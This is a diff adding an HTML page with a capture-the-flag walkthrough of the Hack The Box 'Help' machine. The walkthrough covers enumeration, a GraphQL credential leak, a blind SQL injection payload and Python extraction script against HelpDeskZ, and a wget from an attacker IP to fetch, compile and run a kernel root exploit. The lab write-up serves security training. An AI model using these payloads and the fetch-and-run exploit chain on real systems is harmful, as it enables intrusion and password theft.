@@ -1,0 +1,234 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Help</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.1</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Did not follow redirect to http://help.htb/
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">Two HTTP servers(Port80 & 3000)and ssh(22) are open on target machine. </p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/1-home.png' %}" alt="">
+    <p class="text">First access lead us to http://help.htb. Let's see what's there after adding the domain to /etc/hosts. <br><u><code>echo '&lt;target_ip&gt; help.htb' | sudo tee -a /etc/hosts</code></u> <br> The home page is apache default page. We seem to have to enumerate directories more deeper.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w gobuster dir -w /usr/share/seclists/Discovery/Web-Contet/common.txt -u http://help.htb/ -t 40</u>
+===============================================================
+/.htaccess            (Status: 403) [Size: 292]
+/.htpasswd            (Status: 403) [Size: 292]
+/.hta                 (Status: 403) [Size: 287]
+/index.html           (Status: 200) [Size: 11321]
+/javascript           (Status: 301) [Size: 309] [--&gt; http://help.htb/javascript/]
+/server-status        (Status: 403) [Size: 296]
+/support              (Status: 301) [Size: 306] [--&gt; http://help.htb/support/]
+
+===============================================================</code></pre></div>
+
+<p class="text">There are several directory, but just one dir 'support' is interesting. We often can ignore javascritpts.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/2-support.png' %}" alt="">
+    <p class="text">This page uses management tool <u>HelpDeskz</u>. <br>Google overview says... <br><br> "HelpDeskz is a free, open-source, PHP-based help desk software that allows businesses to manage customer support tickets through a web-based system." <br><br> Though we found management system, I couldn't find any fields where we might exploit. So, let's go to port 3000 next.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/3-3000.png' %}" alt="">
+    <p class="text">This default page is also simple one. It says <br><br> "HelpDeskz is a free, open-source, PHP-based help desk software that allows businesses to manage customer support tickets through a web-based system". Again, we have to enumerate directories.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Contet/common.txt -u http://help.htb:3000 -t 70</u>
+Starting gobuster in directory enumeration mode
+===============================================================
+
+===============================================================
+Finished
+===============================================================</code></pre></div>
+
+
+<p class="text">Small wordlist doesn't return new information. We may see something with bigger wordlist...</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Contet/big.txt -u http://help.htb:3000 -t 70</u>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/graphql              (Status: 400) [Size: 18]
+Progress: 20478 / 20479 (100.00%)
+===============================================================
+Finished
+===============================================================</code></pre></div>
+
+<p class="text">This time, only one path <u>graphql</u> is returned. Let's see this page.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/4-query.png' %}" alt="">
+    <p class="text">When I open the page, it only shows a message 'GET query missing'. It seems that we have to add query string to url...</p>
+</div>
+
+
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/5.png' %}" alt="">
+    <p class="text">With a little research, I found interesting page <a href="https://github.com/apollographql/apollo-server/issues/895">here</a>. It seems to be connected to json database and returns queried data. </p>
+</div>
+
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/help/6-hint.png' %}" alt="">
+    <p class="text">While I'm trying probable keyword randomly, <u>graphql?query={username}</u> returned interesting hint. <br><br> <code>'Cannot query field "username" on type "Query". Did you mean "user"?'</code> <br><br> Try it again with this query keyword.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/7-hint2.png' %}" alt="">
+    <p class="text">This time, it returned ... <br><br><code>'Field "user" of type "User" must have a selection of subfields. Did you mean "user { ... }"?'</code> <br><br>This hint, namely hint2 tells us we can query data with the structure... <br> <br> <code>graphql?query={user{keyword}}</code></p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/8-credential.png' %}" alt="">
+    <p class="text">Inputting standard data key returned hashed password and email address. We can use this on HelpDeskz. Checking with <a href="https://crackstation.net/">crack station</a>, plain text password  'godhelpmeplz' is revealed.<br><br><u>godhelpmeplz | helpme@helpme.com</u></p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/9-helpdeskz.png' %}" alt="">
+    <img src="{% static 'EthHack/images/help/10-upload.png' %}" alt="">
+</div>
+
+<p class="text">Navigating to <u>Submit a Ticket > Next</u> , there is a form where we can upload arbitrary file. Please upload file first. It's ok with txt or png extension.</p>
+
+
+<p class="text">Searching exploit database revealed there is SQL injection vulnerability, not file uploading. <a href="https://www.exploit-db.com/exploits/41200">Page here</a></p>
+
+<p class="text">It says the query parameter is exploitable for sql injection string like this...</p>
+<div class="code-box"><pre><code>?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=1%20or%201=1%20and%20ascii(substr((SeLeCt%20table_name%20from%20information_schema.columns%20where%20table_name%20like%20'%staff'%20%20limit%200,1),1,1))%20=%20%2047%20--%20-</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/11-burp.png' %}" alt="">
+    <p class="text">As this poc says, there is a parameter string ...<u>param[]=&param[]=attachmentparam[]=1&param[]=1</u>... <br><br> However, we can leak data with blind sql and text leaks are unavailable. When the query returns true, our machine install file we uploaded, and if error, we see error page.</p>
+</div>
+
+
+<p class="text">Though we can use sqlmap for database enumeration, I wrote python code for automation practice.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/hash.png' %}" alt="">
+    <p class="text">From <a href="https://github.com/ViktorNova/HelpDeskZ/blob/master/controllers/login_controller.php">HelpDeskz source code</a>, we can know password hash is <u>SHA1</u>, which maximum length is 40 chars. Also, database name is <u>staff.</u></p>
+</div>
+
+<div class="code-box"><pre><code>import requests
+import string
+import sys
+
+<u class="green">Replace cookies with yours</u>
+cookies = {
+    "lang": "english",
+    "PHPSESSID": "2ua18hkd7h9pk44e3nr9dtjmp3",
+    "usrhash": "0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BF%2BSB7cv8hvRzpZX7Bthmz2NygIUCMcQlk5qJqAMBn5Zg%3D%3D"
+}
+
+
+base_url = 'http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6%20'
+chars = list(string.ascii_lowercase) + list(string.digits)
+password = []
+
+i = 1
+
+<u class="green">SHA1 length = 40...</u>
+while i &lt;= 40:
+    for j in chars:
+        url = base_url + f"AND%20substr((select%20password%20from%20staff%20limit%200,1),{i},1)%20=%20'{j}'"
+        response = requests.get(url,cookies=cookies)
+        data = response.text
+        if "Click to go back to the helpdesk home page" not in data:
+            password.append(j)
+            print("Found data : " + ''.join(password))
+            i += 1
+            break</code></pre></div>
+
+<p class="text">It returned ...</p>
+<div class="code-box"><pre><code>Found data : d318f44739dced66793b1a603028133a76ae680e</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/help/12.png' %}" alt="">
+    <p class="text">We got password for user help <u>Welcome1</u>.</p>
+</div>
+
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>└─$ <u>sshpass -p 'Welcome1' ssh help@help.htb</u>
+Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+You have new mail.
+Last login: Tue Oct  7 22:09:59 2025 from 10.10.14.7
+help@help:~$ </code></pre></div>
+
+
+<div class="code-box"><pre><code>help@help:~$ <u>uname -a; cat /etc/os-release </u>
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+NAME="Ubuntu"
+VERSION="16.04.5 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.5 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial</code></pre></div>
+
+
+<p class="text">This kernel version looks old. Searching <u>4.4.0-116-generic</u> immediately returns <a href="https://www.exploit-db.com/exploits/44298">this exploit code</a>. We can get root access with this code easily.</p>
+
+
+
+<div class="code-box"><pre><code><u class="green">#Download above exploit code first and navigate to dir where downloaded file locates.</u>
+└─$ python3 -m http.server <u class="green">#On your local machine</u>
+help@help:~$ cd /tmp
+help@help:/tmp$ wget http://10.10.14.7:8000/44298.c
+help@help:/tmp$ gcc 42298.c -o kernel_exp
+help@help:/tmp$ chmod +x kernel_exp
+help@help:/tmp$ ./kernel_exp
+<u>root</u>@help:/tmp$</code></pre></div>
+
+<p class="text">You can find root flag in /root/root.txt</p>
+
+
+</body>
+</html>
